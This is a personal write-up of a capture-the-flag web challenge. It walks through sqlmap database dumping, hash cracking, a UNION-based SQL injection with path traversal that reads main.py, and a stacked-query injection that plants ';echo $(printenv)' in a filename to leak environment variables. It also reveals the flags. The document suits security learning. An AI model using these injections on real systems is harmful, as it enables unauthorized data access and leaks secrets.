# Photo Gallery

**Analysis:** 
1. Image gallery with pictures of cats.
2. `GET /fetch?id=3` returns internal server error
3. Database details:

```php
[INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.25.3.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```


```php
sqlmap -r idreq.txt --dbs --batch
```

`level5`

```php
sqlmap -r idreq.txt -D level5 --tables --batch --threads 2
```

`albums`
`photots`

```php
sqlmap -r idreq.txt -D level5 -T albums --dump --batch --threads 2
```

`Kittens`

```php
sqlmap -r idreq.txt -D level5 -T photos --dump --batch --threads 2
```

```php
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716 |
+----+------------------+--------+------------------------------------------------------------------+
```

Interesting filename for the invisible file that is producing the internal server error:

`b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716`

`/fetch?id=b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716`

```php
b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716 - Possible algorithms: SHA256, GOST R 34.11-94, SHA384, SHA3-256, Keccak-256, sha256(md5($plaintext))
```

Find hash with kali tools
```php
hashid -m hash.txt
```

```php
--File 'hash.txt'--
Analyzing 'b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716'
[+] Snefru-256 
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box 
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256 
[+] Skein-512(256) 
--End of file 'hash.txt'-- 
```

Crack with hashcat:

```php
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Output:

```php
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
```

206b72697374656e616e6e65
kristenanne

This part was unnecessary, the first filename that i found was the flag itself.

Flag
`b2fd336bf2f41fe2033d8dc5baf455cf82679c9e0416b693d0a69eed805f7716`

Looking at the app documentation:

https://github.com/tiangolo/uwsgi-nginx-flask-docker/blob/master/example-flask-package-python3.8/app/app/main.py

![[Pasted image 20240911074145.png]]

```php
GET /fetch?id=-1+UNION+select+'/../../main.py'
```

![[Pasted image 20240911074258.png]]

Flag
`^FLAG^df7ef596669744bd4333db268baad9c2d5c86ada8f773d340779f00c653dde51$FLAG$`

Sets the filename to `;echo $(printenv)` for the image with the `id=3` which gets injected in the source code.

GET fetch?id=
```php
3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
```

`GET fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;`

![[Pasted image 20240911074933.png]]

![[Pasted image 20240911074954.png]]

Flag
`^FLAG^703a4483a3685142ba0736e5a3e658e10fa384554c50c03189cc45a3a1e78e8a$FLAG$`

---

**Completed:** _07:53 2024-09-11_

